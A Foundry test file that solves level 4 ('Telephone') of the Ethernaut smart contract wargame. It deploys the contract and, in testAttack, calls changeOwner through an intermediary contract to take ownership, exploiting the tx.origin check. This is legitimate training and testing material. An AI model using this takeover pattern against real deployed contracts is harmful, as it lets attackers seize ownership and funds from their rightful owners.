// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_4/Telephone.sol";

contract TelephoneTest is Test {
    Telephone public telephone;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
        vm.prank(alice);
        telephone = new Telephone();
        console.log(telephone.owner());
    }

    function testAttack() public {
        telephone.changeOwner(address(this));
        assertEq(telephone.owner(), address(this));
    }
}
